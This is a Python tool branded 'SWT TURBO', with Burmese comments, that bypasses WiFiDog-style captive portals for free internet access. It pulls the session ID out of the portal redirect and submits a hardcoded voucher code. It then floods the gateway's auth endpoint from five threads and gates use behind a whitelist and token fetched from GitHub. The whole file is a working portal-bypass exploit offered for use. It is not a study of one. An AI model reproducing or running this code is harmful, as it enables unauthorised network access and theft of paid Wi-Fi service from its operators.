import requests
import re
import urllib3
import time
import threading
import os
import sys
import psutil
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
# သင်ပေးထားတဲ့ Token လင့်ခ်
TOKEN_SOURCE_URL = "https://raw.githubusercontent.com/swt21200/win/refs/heads/main/token.txt"
WHITELIST_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
PING_THREADS = 5
PING_INTERVAL = 0.1 

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    clear_screen()
    banner = """
    \033[1;32m
    ##########################################
    #                                        #
    #              SWT  TURBO                #
    #        FAST & UNLIMITED ACCESS         #
    #                                        #
    ##########################################
    \033[0m
    """
    print(banner)

def get_data_usage():
    """လက်ရှိ အသုံးပြုနေတဲ့ Total Data Usage (MB) ကို တွက်ချက်ရန်"""
    try:
        net_io = psutil.net_io_counters()
        total_bytes = net_io.bytes_sent + net_io.bytes_recv
        return total_bytes / (1024 * 1024)
    except: return 0

def check_approval():
    """Device ID နှင့် Token အချိန်ကို keys.txt နဲ့ စစ်ဆေးခြင်း"""
    try:
        # --- TOKEN LOGIC ADDED ---
        print("[*] Fetching Latest Token...")
        response_token = requests.get(TOKEN_SOURCE_URL, timeout=10)
        current_token = response_token.text.strip()
        print(f"\033[1;36m[+] Token Loaded: {current_token}\033[0m")
        # --------------------------

        device_id = os.popen("id -u -n").read().strip()
        print(f"\033[1;33m[*] Detected ID: {device_id}\033[0m")
        print("[*] Checking Authorization...")
        
        headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
        response = requests.get(WHITELIST_URL, headers=headers, timeout=10)
        
        allowed_data = response.text.splitlines()
        
        # ID နှင့် အချိန်ကို ခွဲထုတ်ခြင်း
        for entry in allowed_data:
            if ":" in entry:
                user_id, minutes = entry.split(":")
                if user_id == device_id:
                    print(f"\033[1;32m[+] Access Granted! Token Duration: {minutes} minutes.\033[0m")
                    time.sleep(1)
                    return int(minutes)
        
        print(f"\n\033[1;31m[!] Access Denied! ID: {device_id} is not registered.\033[0m")
        print("[*] Contact Admin to get token.")
        sys.exit()
        
    except Exception as e:
        print(f"[!] Security Check Error: {e}")
        sys.exit()

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link, session, sid):
    """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း"""
    while True:
        try:
            session.get(auth_link, timeout=5)
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    show_banner()
    # Approval နှင့် အချိန်ကိုယူခြင်း
    token_minutes = check_approval()
    token_limit = time.time() + (token_minutes * 60)
    
    print(f"\n\033[1;33m[1] Start SWT Turbo Internet")
    print("[0] Exit\033[0m")
    choice = input("\nSelect Option: ")
    if choice != '1':
        print("Exiting...")
        sys.exit()
        
    clear_screen()
    show_banner()
    print("[*] Initializing system... Connecting to Gateway...")
    
    start_time = time.time()
    start_data = get_data_usage()

    while True:
        # Token အချိန်ကုန်မကုန် စစ်ဆေးခြင်း
        if time.time() > token_limit:
            print("\n\033[1;31m[!] Token Expired! Please renew your token.\033[0m")
            sys.exit()

        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    # Live Time, Data Usage နှင့် ကျန်ရှိသော Token အချိန်
                    elapsed = time.time() - start_time
                    mins, secs = divmod(int(elapsed), 60)
                    hours, mins = divmod(mins, 60)
                    
                    # ကျန်ရှိသော Token အချိန် (မိနစ်)
                    remaining = int((token_limit - time.time()) / 60)
                    
                    current_data = get_data_usage() - start_data
                    print(f"\r\033[1;36m[*] Time: {hours:02d}:{mins:02d}:{secs:02d} | Used: {current_data:.2f} MB | Token: {remaining} min | Status: OK\033[0m", end='', flush=True)
                    time.sleep(5)
                    continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            # ၁။ SID ရှာဖွေခြင်း
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                # ၂။ Voucher ကို တစ်ကြိမ် "မဖြစ်မနေ" အရင်စမ်းသပ်ခြင်း
                print(f"\n[*] Activating Session with Voucher API...")
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try:
                    # accessCode နေရာတွင် 123456 အပြင် လိုအပ်ပါက ပြောင်းလဲနိုင်သည်
                    v_res = session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                    print(f"[+] Voucher API Response: {v_res.status_code}")
                except:
                    print("[!] Voucher API Failed (Gateway might not require it)")

                # ၃။ Gateway Info ယူပြီး Ping ထိုးခြင်း
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                print(f"[*] SID: {sid} | Starting {PING_THREADS} Turbo Threads...")

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                while check_real_internet():
                    time.sleep(5)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    start_process()

